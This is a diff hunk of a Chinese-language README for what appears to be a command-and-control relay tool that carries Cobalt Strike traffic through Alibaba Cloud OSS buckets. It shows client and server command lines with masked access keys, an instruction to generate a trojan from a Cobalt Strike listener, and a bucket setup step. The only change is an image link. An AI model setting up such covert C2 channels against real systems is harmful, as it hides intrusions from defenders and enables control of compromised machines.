@@ -34,7 +34,7 @@ aliyun-oss-c2-core.exe -mode client -address 127.0.0.1:8080 -endpoint oss-cn-bei
 aliyun-oss-c2-core.exe -mode server -address 127.0.0.1:8080 -endpoint oss-cn-beijing.aliyuncs.com -id LTAI5tNEupVMgZYjkJELsXXX -key qGTqABP1sQSxGhwSvt6J1W8QXXXXXX -bucket XXXX
 ```
 首先，现在cs生成一个http的listen，并把host都改成127.0.0.1，然后生成木马
-![1.jpg][1]
+![img.png](.README/img3.png)
 
 1、去阿里云申请一个OSS的Bucket列表，Buckert的名称对应上面的-bucket的值
 https://oss.console.aliyun.com/bucket
